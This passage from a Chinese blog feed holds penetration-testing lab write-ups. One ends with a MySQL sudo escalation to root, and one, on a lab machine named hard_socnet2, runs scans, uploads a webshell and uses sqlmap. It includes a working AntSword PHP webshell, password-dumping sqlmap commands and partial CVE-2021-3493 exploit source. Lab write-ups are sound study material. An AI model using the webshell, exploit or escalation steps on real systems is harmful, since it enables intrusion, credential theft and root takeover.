class="number">104</span><span class="symbol">:</span><span class="number">110</span><span class="symbol">:</span><span class="symbol">:/home/syslog</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">_apt:</span><span class="symbol">x:</span><span class="number">105</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">tss:</span><span class="symbol">x:</span><span class="number">106</span><span class="symbol">:</span><span class="number">111</span><span class="symbol">:TPM</span> software stack,,,<span class="symbol">:/var/lib/tpm</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">uuidd:</span><span class="symbol">x:</span><span class="number">107</span><span class="symbol">:</span><span class="number">112</span><span class="symbol">:</span><span class="symbol">:/run/uuidd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">tcpdump:</span><span class="symbol">x:</span><span class="number">108</span><span class="symbol">:</span><span class="number">113</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">landscape:</span><span class="symbol">x:</span><span class="number">109</span><span class="symbol">:</span><span class="number">115</span><span class="symbol">:</span><span class="symbol">:/var/lib/landscape</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">pollinate:</span><span class="symbol">x:</span><span class="number">110</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:</span><span class="symbol">:/var/cache/pollinate</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">usbmux:</span><span class="symbol">x:</span><span class="number">111</span><span class="symbol">:</span><span class="number">46</span><span class="symbol">:usbmux</span> daemon,,,<span class="symbol">:/var/lib/usbmux</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">coredump:</span><span class="symbol">x:</span><span class="number">999</span><span class="symbol">:</span><span class="number">999</span><span class="symbol">:systemd</span> Core <span class="symbol">Dumper:</span>/<span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">lxd:</span><span class="symbol">x:</span><span class="number">998</span><span class="symbol">:</span><span class="number">100</span><span class="symbol">:</span><span class="symbol">:/var/snap/lxd/common/lxd</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">mysql:</span><span class="symbol">x:</span><span class="number">112</span><span class="symbol">:</span><span class="number">117</span><span class="symbol">:MySQL</span> Server,,,<span class="symbol">:/nonexistent</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">wpadmin:</span><span class="symbol">x:</span><span class="number">1001</span><span class="symbol">:</span><span class="number">1001</span><span class="symbol">:</span><span class="symbol">:/home/wpadmin</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure>

<p>发现wpadmin账号</p>
<p>执行如下命令提权</p>
<p>su wpadmin (密码使用前面爆破的adam14)</p>
<p>提权成功，获取到第一个flag</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">wpadmin<span class="variable">@wp</span><span class="symbol">:/var/www/html/wordpress</span><span class="variable">$ </span>cat /home/wpadmin/local.txt</span><br><span class="line"><span class="number">153495</span>edec1b606c24947b1335998bd9</span><br></pre></td></tr></table></figure>





<h2 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h2><h3 id="查看wordpress配置文件"><a href="#查看wordpress配置文件" class="headerlink" title="查看wordpress配置文件"></a>查看wordpress配置文件</h3><p>查看wordpress配置文件<code>cat /var/www/html/wordpress/wp-config.php</code></p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">www<span class="params">-data</span>@wp:/<span class="built_in">var</span>/www/html/wordpress$ cat /<span class="built_in">var</span>/www/html/wordpress/wp<span class="params">-config.php</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;admin&#x27;</span> );</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;Wp_Admin#123&#x27;</span> );</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;-=&lt;%h-&amp;zmo1#bWHqHEib?bJt!)mOL7E+j&#123;x7x;Hsc&#125;t?xm?=kRfunrRmTUP;#8OS&#x27;</span> );</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;A5#uw+^B_f:K]WNq@aoXLpD@bmMD/hev^UAf,^lTCX3@a1&amp;7A(qLFS_&#123;I=pYw(ET&#x27;</span> );</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;~*TFb3]y1^|G9j%?Z@F[63A+AAT&lt;mndFo-H&#123;q0P#Nz/qYN3da@UXyY6YP6`7QNmy&#x27;</span> );</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;bP88&lt;WoD?9;eN0yM9A&#123;+])!$(k[zp&#123;:-.ZS6Fk*snlJN&amp;GXU6Zy_)wEbqk&gt;-? nn&#x27;</span> );</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;SX%VenTL%k&amp;f%i8tFAhtf#svIc|nt.&amp;t~R%zp=:n:Q%e0Ux?k,-j?ZAjZZ%;w1ih&#x27;</span> );</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;-e Z&lt;w&lt;q8F~Tm7IeNu2nSa^or=*B?bV*yRBa+4; My&#125;cIJ]?L%j14RWghI,D^M^5&#x27;</span> );</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;&#125;Z&#125;fYC%Mv;;ON/h~$c2c,u[FZ&gt;`YaiscN6UY&amp;HCcXUVl&#123;miUbX4a/ LdJ^AoL/Z&#123;&#x27;</span> );</span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;BQPaC,#p&#125;PEcU^eC*Hwss&gt;9~UCEKhv]tox~PN)?B.kSn%tC)V~pZ6RpOBR&gt;80o5+&#x27;</span> );</span><br><span class="line"></span><br><span class="line">$table_prefix = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! defined( <span class="string">&#x27;ABSPATH&#x27;</span> ) ) &#123;</span><br><span class="line">	<span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;ABSPATH&#x27;</span>, __DIR__ . <span class="string">&#x27;/&#x27;</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现数据库账号密码，但是并没有什么卵用</p>
<h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><p>查看sudo权限</p>
<p>执行<code>sudo -l </code></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">wpadmin<span class="variable">@wp</span><span class="symbol">:/var/www/html/wordpress</span><span class="variable">$ </span>sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> wpadmin on <span class="symbol">wp:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=<span class="regexp">/usr/local</span><span class="regexp">/sbin\:/usr</span><span class="regexp">/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span>\<span class="symbol">:/snap/bin</span></span><br><span class="line"></span><br><span class="line">User wpadmin may run the following commands on <span class="symbol">wp:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /usr/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure>

<p>那么执行如下命令(需要加上sudo, 密码就是wpadm账号的密码)</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure>

<p>进入数据库，当前数据库是root启动，所以是mysql是root权限。</p>
<h3 id="mysql-system提权"><a href="#mysql-system提权" class="headerlink" title="mysql system提权"></a>mysql system提权</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">MariaDB [wordpress]&gt;<span class="built_in"> system </span>id</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br></pre></td></tr></table></figure>

<p>获取shell</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">MariaDB [wordpress]&gt; system /bin/bash</span><br><span class="line">root<span class="variable">@wp</span><span class="symbol">:/var/www/html/wordpress</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>或者不是用system也行，使用<code>\!</code></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">MariaDB [wordpress]&gt; \! id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">MariaDB [wordpress]&gt; \! <span class="regexp">/bin/bash</span></span><br><span class="line">root<span class="variable">@wp</span><span class="symbol">:/var/www/html/wordpress</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>



<p>第二个flag</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@wp</span><span class="symbol">:/var/www/html/wordpress</span><span class="comment"># cat /root/proof.txt</span></span><br><span class="line"><span class="number">7</span>efd721c8bfff2937c66235f2d0dbac1</span><br></pre></td></tr></table></figure>

























]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>打靶练习5-hard_socnet2</title>
    <url>/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A05-hard-socnet2/</url>
    <content><![CDATA[<p>CVE-2021-3943 | xmlrpc利用 | python升级shell | GDB | 缓冲区溢出</p>
<span id="more"></span>

<h2 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1. 主机发现"></a>1. 主机发现</h2><h3 id="arp主机发现"><a href="#arp主机发现" class="headerlink" title="arp主机发现"></a>arp主机发现</h3><p>使用arp进行主机发现</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="string">[root@kali ~]</span># arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: <span class="number">00</span>:0c:<span class="number">29</span>:<span class="number">03</span>:ac:<span class="number">71</span>, IPv4: <span class="number">172</span>.<span class="number">16</span>.<span class="number">42</span>.<span class="number">147</span></span><br><span class="line">Starting arp-scan <span class="number">1</span>.<span class="number">9</span>.<span class="number">7</span> with <span class="number">256</span> hosts (https://github.com/royhills/arp-scan)</span><br><span class="line"><span class="number">172.16.42.1</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:c0:<span class="number">00</span>:<span class="number">08</span>	VMware, Inc.</span><br><span class="line"><span class="number">172.16.42.205</span>	<span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">17</span>:<span class="number">42</span>:<span class="number">82</span>	PCS Systemtechnik GmbH</span><br><span class="line"><span class="number">172.16.42.254</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:fd:c7:e1	VMware, Inc</span><br></pre></td></tr></table></figure>

<p>明显172.16.42.205就是我们的靶机地址了。</p>
<h3 id="nmap全端口扫描"><a href="#nmap全端口扫描" class="headerlink" title="nmap全端口扫描"></a>nmap全端口扫描</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">[root@kali ~]# <span class="keyword">nmap</span> -<span class="keyword">p</span>- <span class="number">172.16</span>.<span class="number">42.205</span></span><br><span class="line">Starting Nmap <span class="number">7.91</span> ( http<span class="variable">s:</span>//<span class="keyword">nmap</span>.org ) at <span class="number">2022</span>-<span class="number">11</span>-<span class="number">13</span> <span class="number">02</span>:<span class="number">30</span> EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">172.16</span>.<span class="number">42.205</span></span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00040</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">8000</span>/tcp <span class="keyword">open</span>  http-alt</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">17</span>:<span class="number">42</span>:<span class="number">82</span> (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>



<h3 id="nmap服务识别"><a href="#nmap服务识别" class="headerlink" title="nmap服务识别"></a>nmap服务识别</h3><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[root@kali ~]</span># <span class="selector-tag">nmap</span> <span class="selector-tag">-p22</span>,<span class="selector-tag">80</span>,<span class="selector-tag">8000</span> <span class="selector-tag">-sV</span> <span class="selector-tag">172</span><span class="selector-class">.16</span><span class="selector-class">.42</span><span class="selector-class">.205</span></span><br><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="selector-tag">7</span><span class="selector-class">.91</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2022-11-13 02:32 EST</span></span><br><span class="line">Nmap scan report for <span class="number">172.16</span>.<span class="number">42.205</span></span><br><span class="line">Host is up (<span class="number">0.00042s</span> latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">29</span> ((Ubuntu))</span><br><span class="line"><span class="number">8000</span>/tcp open  http    BaseHTTPServer <span class="number">0.3</span> (Python <span class="number">2.7</span>.<span class="number">15</span>rc1)</span><br><span class="line">MAC <span class="attribute">Address</span>: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">17</span>:<span class="number">42</span>:<span class="number">82</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service <span class="attribute">Info</span>: <span class="attribute">OS</span>: Linux; <span class="attribute">CPE</span>: <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">linux</span>:linux_kernel</span><br></pre></td></tr></table></figure>







<h2 id="web入侵"><a href="#web入侵" class="headerlink" title="web入侵"></a>web入侵</h2><h3 id="文件上传webshell"><a href="#文件上传webshell" class="headerlink" title="文件上传webshell"></a>文件上传webshell</h3><p>访问<code>http://172.16.42.205/</code> , 注册一个账号</p>
<p>头像处上穿马获取到shell，使用的webshell <code>https://github.com/AntSwordProject/AwesomeScript/blob/master/php/php_create_function_script.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*              _   ____                       _</span></span><br><span class="line"><span class="comment">*   __ _ _ __ | |_/ ___|_      _____  _ __ __| |</span></span><br><span class="line"><span class="comment">*  / _` | &#x27;_ \| __\___ \ \ /\ / / _ \| &#x27;__/ _` |</span></span><br><span class="line"><span class="comment">* | (_| | | | | |_ ___) \ V  V / (_) | | | (_| |</span></span><br><span class="line"><span class="comment">*  \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|</span></span><br><span class="line"><span class="comment">* ———————————————————————————————————————————————</span></span><br><span class="line"><span class="comment">*     AntSword PHP Create_Function Script</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">*     警告：</span></span><br><span class="line"><span class="comment">*         此脚本仅供合法的渗透测试以及爱好者参考学习</span></span><br><span class="line"><span class="comment">*          请勿用于非法用途，否则将追究其相关责任！</span></span><br><span class="line"><span class="comment">* ———————————————————————————————————————————————</span></span><br><span class="line"><span class="comment">*  pwd = ant</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$ant</span>=create_function(<span class="string">&quot;&quot;</span>, base64_decode(<span class="string">&#x27;QGV2YWwoJF9QT1NUWyJhbnQiXSk7&#x27;</span>));</span><br><span class="line"><span class="variable">$ant</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>搜索处存在sql注入</p>
<p>抓包，保存为txt，用sqlmap跑一跑</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -r <span class="selector-tag">a</span><span class="selector-class">.txt</span> -<span class="selector-tag">p</span> <span class="string">&quot;query&quot;</span></span><br></pre></td></tr></table></figure>



<p><strong>查看数据库</strong></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -r <span class="selector-tag">a</span><span class="selector-class">.txt</span> -<span class="selector-tag">p</span> <span class="string">&quot;query&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[*]</span> information_schema</span><br><span class="line"><span class="selector-attr">[*]</span> mysql</span><br><span class="line"><span class="selector-attr">[*]</span> performance_schema</span><br><span class="line"><span class="selector-attr">[*]</span> socialnetwork</span><br><span class="line"><span class="selector-attr">[*]</span> sys</span><br></pre></td></tr></table></figure>



<p><strong>查看表</strong></p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -r a.txt -p &quot;query&quot; -D socialnetwork --tables</span><br><span class="line"></span><br><span class="line"><span class="meta">[4 tables]</span></span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">| friendship |</span><br><span class="line">| posts      |</span><br><span class="line">| user_phone |</span><br><span class="line"><span class="section">| users      |</span></span><br><span class="line"><span class="section">+------------+</span></span><br></pre></td></tr></table></figure>



<p><strong>查看字段</strong></p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">sqlmap -r a.txt -p <span class="string">&quot;query&quot;</span> -D socialnetwork -T users --columns</span><br><span class="line"></span><br><span class="line">+----------------+--------------+</span><br><span class="line">|<span class="string"> Column         </span>|<span class="string"> Type         </span>|</span><br><span class="line">+----------------+--------------+</span><br><span class="line">|<span class="string"> user_about     </span>|<span class="string"> text         </span>|</span><br><span class="line">|<span class="string"> user_birthdate </span>|<span class="string"> date         </span>|</span><br><span class="line">|<span class="string"> user_email     </span>|<span class="string"> varchar(255) </span>|</span><br><span class="line">|<span class="string"> user_firstname </span>|<span class="string"> varchar(20)  </span>|</span><br><span class="line">|<span class="string"> user_gender    </span>|<span class="string"> char(1)      </span>|</span><br><span class="line">|<span class="string"> user_hometown  </span>|<span class="string"> varchar(255) </span>|</span><br><span class="line">|<span class="string"> user_id        </span>|<span class="string"> int(11)      </span>|</span><br><span class="line">|<span class="string"> user_lastname  </span>|<span class="string"> varchar(20)  </span>|</span><br><span class="line">|<span class="string"> user_nickname  </span>|<span class="string"> varchar(20)  </span>|</span><br><span class="line">|<span class="string"> user_password  </span>|<span class="string"> varchar(255) </span>|</span><br><span class="line">|<span class="string"> user_status    </span>|<span class="string"> char(1)      </span>|</span><br><span class="line">+----------------+--------------+</span><br></pre></td></tr></table></figure>



<p><strong>查看字段内容</strong></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -r <span class="selector-tag">a</span><span class="selector-class">.txt</span> -<span class="selector-tag">p</span> <span class="string">&quot;query&quot;</span> -D socialnetwork -T users -C <span class="string">&quot;user_password, user_email&quot;</span> --dump</span><br></pre></td></tr></table></figure>









<h2 id="CVE-2021-3493提权"><a href="#CVE-2021-3493提权" class="headerlink" title="CVE-2021-3493提权"></a>CVE-2021-3493提权</h2><p>查看内核版本</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">(www-data:<span class="regexp">/var/</span>www<span class="regexp">/html/</span>data<span class="regexp">/images/</span>posts) $ uname -a</span><br><span class="line">Linux socnet2 <span class="number">4.15</span>.<span class="number">0</span>-<span class="number">38</span>-generic <span class="comment">#41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>



<p>查看系统版本</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">(www-data:<span class="regexp">/var/</span>www<span class="regexp">/html/</span>data<span class="regexp">/images/</span>posts) $ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:    Ubuntu</span><br><span class="line"><span class="keyword">Description</span>:    Ubuntu <span class="number">18.04</span>.<span class="number">1</span> LTS</span><br><span class="line">Release:    <span class="number">18.04</span></span><br><span class="line">Codename:    bionic</span><br></pre></td></tr></table></figure>



<h3 id="CVE-2021-3493"><a href="#CVE-2021-3493" class="headerlink" title="CVE-2021-3493"></a>CVE-2021-3493</h3><p><strong>Affected Versions</strong></p>
<ul>
<li>Ubuntu 20.10</li>
<li>Ubuntu 20.04 LTS</li>
<li>Ubuntu 19.04</li>
<li>Ubuntu 18.04 LTS</li>
<li>Ubuntu 16.04 LTS</li>
<li>Ubuntu 14.04 ESM</li>
</ul>
<p>可以看见18.04是存在cve-2021-3493的</p>
<p>漏洞利用代码：<a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
<ul>
<li>exploit.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#include &lt;attr/xattr.h&gt;</span></span><br><span class="line"><span class="comment">//#include &lt;sys/xattr.h&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setxattr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">void</span> *value, <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIR_BASE    <span class="meta-string">&quot;./ovlcap&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIR_WORK    DIR_BASE <span class="meta-string">&quot;/work&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIR_LOWER   DIR_BASE <span class="meta-string">&quot;/lower&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIR_UPPER   DIR_BASE <span class="meta-string">&quot;/upper&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIR_MERGE   DIR_BASE <span class="meta-string">&quot;/merge&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIN_MERGE   DIR_MERGE <span class="meta-string">&quot;/magic&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIN_UPPER   DIR_UPPER <span class="meta-string">&quot;/magic&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">xmkdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">mode_t</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mkdir(path, mode) == <span class="number">-1</span> &amp;&amp; errno != EEXIST)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mkdir %s&quot;</span>, path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">xwritefile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">const</span> <span class="keyword">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(path, O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;open %s&quot;</span>, path);</span><br><span class="line">    <span class="keyword">ssize_t</span> len = (<span class="keyword">ssize_t</span>) <span class="built_in">strlen</span>(data);</span><br><span class="line">    <span class="keyword">if</span> (write(fd, data, len) != len)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;write %s&quot;</span>, path);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">xcopyfile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *src, <span class="keyword">const</span> <span class="keyword">char</span> *dst, <span class="keyword">mode_t</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fi, fo;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fi = open(src, O_RDONLY)) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;open %s&quot;</span>, src);</span><br><span class="line">    <span class="keyword">if</span> ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;open %s&quot;</span>, dst);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">ssize_t</span> rd, wr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        rd = read(fi, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="keyword">if</span> (rd == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rd == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno == EINTR)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;read %s&quot;</span>, src);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *p = buf;</span><br><span class="line">        <span class="keyword">while</span> (rd &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            wr = write(fo, p, rd);</span><br><span class="line">            <span class="keyword">if</span> (wr == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (errno == EINTR)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;write %s&quot;</span>, dst);</span><br><span class="line">            &#125;</span><br><span class="line">            p += wr;</span><br><span class="line">            rd -= wr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fi);</span><br><span class="line">    close(fo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 